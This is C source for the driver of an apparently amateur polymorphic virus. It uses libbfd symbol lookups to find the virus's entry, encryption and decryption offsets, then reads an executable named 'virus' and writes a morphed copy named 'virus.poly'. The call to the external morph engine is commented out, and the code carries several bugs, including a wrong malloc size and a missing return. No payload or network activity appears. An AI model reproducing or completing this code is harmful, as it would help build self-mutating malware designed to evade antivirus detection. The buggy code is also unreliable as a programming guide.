#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <bfd.h>

extern int morph_engine(char* exe_data, size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);

typedef struct node {
  const char* name;
  unsigned int vma;
  struct node * next;
} sym;

sym * getsymtable(char *file);

// Function to convert unsigned integer to char array w base
char* tostring(int val, char* buf, int base) {
	int i = 0;

	if (val == 0) {
		buf[i++] = '0';
		buf[i] = '\0';
		return buf;
	}
	while (val != 0) {
		int r = val % base;
		if (r > 9) {
			buf[i++] = (r - 10) + 'a';
		}
		else {
			buf[i++] = r + '0';
		}
		val = val / base;
	}
	buf[i] = '\0';

	char* str = malloc(sizeof(buf));
	str[i] = '\0';
	int x;
	for (x = 0; x < i; x++) {
		str[x] = buf[i - 1 - x];
	}
	return str;
}


char* getaddress(char *filename, char*symbol){

	// Call library function to get a pointer to a ll
	sym * head = getsymtable(filename);
	// Recursively iterate through ll and print to std out
	sym * current = head;
	while (current != NULL) {
		char newline[1] = {"\n"};
		char* buffer = malloc(32 * sizeof(char));

            if(strcmp(symbol, current->name)==0){
                  char* vma = tostring(current->vma, buffer, 16);
                  return vma;
            }
		free(buffer);
		current = current -> next;
	}
}

int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encrypt_size, unsigned long virus_decrypt_offset)
{
      // // int i;
      // // for (i=0; i<argc; ++i) {
      // // printf("polymorphic argv[%d]=%s\n", i, argv[i]);
      // // }

	// // virus name
	char filename[] = "virus";

      printf("%ul\n", virus_instruction_begin);
      printf("%ul\n", virus_encrypt_size);
      printf("%ul\n", virus_decrypt_offset);

      // char main[]="main";
      // char start[]="_start";
      // char decryption[]="decrypt.decryption_function";
      
	// now create logic to decrypt the whole chunk of file first, because the morphed virus will be encrypted so cant find symobls
	char nogo[]="./virus.poly";
	if(strcmp(nogo,filename)==0){
		printf("hello");
		return 0;
	}

      // write(1, getaddress(filename, main), strlen(getaddress(filename, main)));
      // printf("\n");
      // write(1, getaddress(filename, start), strlen(getaddress(filename, start)));
      // printf("\n");
      // write(1, getaddress(filename, decryption), strlen(getaddress(filename, decryption)));
      // printf("\n");

	// to get offset just delete the most significant char
	char buffer1[15];
	sprintf(buffer1, "%06lx", (unsigned long)virus_instruction_begin);
	char *main_offset = buffer1;
	write(1, main_offset, strlen(main_offset));
	main_offset = main_offset + 1;
	write(1, main_offset, strlen(main_offset));
	printf("\n");

	char buffer3[15];
	sprintf(buffer3, "%06lx", (unsigned long)virus_decrypt_offset);
	char *decryption_offset = buffer3;
	decryption_offset = decryption_offset + 1;
	write(1, decryption_offset, strlen(decryption_offset));

	printf("\n");

      // char *main_offset = sprintf(buffer, "%06lx", (unsigned long)virus_instruction_begin);
	// main_offset = main_offset + 1;
      // char *start_offset = sprintf(buffer, "%06lx", (unsigned long)virus_encrypt_size);
	// start_offset = start_offset + 1;
      // char *decryption_offset = sprintf(buffer, "%06lx", (unsigned long)virus_decrypt_offset);
	// decryption_offset = decryption_offset + 1;

      // write(1, main_offset, strlen(main_offset));

      virus_instruction_begin  = (int)strtol(main_offset, NULL, 16);
	virus_decrypt_offset  = (int)strtol(decryption_offset, NULL, 16);

      printf("%ul\n", virus_instruction_begin);
      printf("%ul\n", virus_decrypt_offset);

      // open the executable file
	FILE* exe_file = fopen(filename, "rb");
	if(!exe_file)
	{
		printf("Failed to open %s\n", filename);
		return -1;
	}

	// get the size of the executable file
	size_t exe_size;
	fseek(exe_file, 0, SEEK_END);
	exe_size = ftell(exe_file);
	rewind(exe_file);

	// allocate the data
	char* exe_data = malloc(exe_size);
	if(!exe_data)
	{
		fclose(exe_file);
		printf("Executable data allocation failed\n");
		return 1;
	}

	// read the entire executable file
	if(!fread(exe_data, exe_size, 1, exe_file))
	{
		fclose(exe_file);
		printf("Executable file read failed\n");
	}

	// close the file
	fclose(exe_file);



	// // call the polymorphic engine
	// if(morph_engine(exe_data, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
	// {
	// 	printf("An error occured in the polymorphic engine\n");

	// }

	// initialize the output filename
	char out_filename[FILENAME_MAX];
	snprintf(out_filename, FILENAME_MAX, "%s.poly", filename);
      printf("/n");
	// open the output file
	FILE* out_file = fopen(out_filename, "wb");
	if(!out_file)
	{
		printf("failed to open %s\n", out_filename);
		// goto quit;
	}

	// write the modified executable data
	if(!fwrite(exe_data, exe_size, 1, out_file))
	{
		printf("failed to write into %s\n", out_filename);
	}

      quit:
            free(exe_data);
      return 0;

}